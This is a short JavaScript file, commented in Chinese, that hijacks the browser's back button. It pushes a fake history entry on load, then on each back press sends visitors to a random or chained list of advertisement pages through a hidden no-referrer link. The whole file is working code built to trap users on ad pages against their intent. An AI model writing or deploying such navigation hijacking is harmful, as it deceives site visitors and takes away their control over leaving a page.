var globalLink = new Array();
//var apidomain =  location.hostname;
//var hostname  = apidomain.split('.');
//var apidomain = '//' + Math.random().toString(36).substr(2) + '.' + location.hostname + '/';
var apidomain = '//' + location.hostname + '/';
// 广告
globalLink.push(apidomain + 'qysq.html');//0
globalLink.push(apidomain + 'tsyj.html');//1
globalLink.push(apidomain + 'xwfkys.html');//2
globalLink.push(apidomain + 'yysx.html');//3
globalLink.push(apidomain + 'zrl.html');//4
globalLink.push(apidomain + 'nkgg.html');//5
//globalLink.push(apidomain + 'mldq.html');
//globalLink.push(apidomain + 'yx.html');
globalLink.push(apidomain + 'ydjz.html');//6
globalLink.push(apidomain + 'lz515y000.html');//7
//顺序 56740123
function hh() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}
window.onload = function(){
    setTimeout('hh();', 50);
};

// 后退
$(window).on('popstate', function(e){
    var number = Math.floor(globalLink.length * Math.random());
    var path = location.pathname.split('.')[0];
    if (path.substr(1) == 'nkgg') {
        number = 6;
    }
    // if (path.substr(1) == 'yx') {
    //     number = 8;
    // }
    if (path.substr(1) == 'ydjz') {
        number = 7;
    }
    if (path.substr(1) == 'lz515y000') {
        number = 4;
    }
    if (path.substr(1) == 'zrl') {
        number = 0;
    }
    if (path.substr(1) == 'qysq') {
        number = 1;
    }
    if (path.substr(1) == 'tsyj') {
        number = 2;
    }
    if (path.substr(1) == 'xwfkys') {
        number = 3;
    }
    if (path.substr(1) == 'yysx') {
        number = 5;
    }
    jump(globalLink[number]);
});

// url跳转
function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}

/**
 * @version  1.0
 * @author   eacher
 * @param
 * @return array | boolean
 */
function yellow() {
    jump(globalLink[Math.floor(globalLink.length * Math.random())]);
}
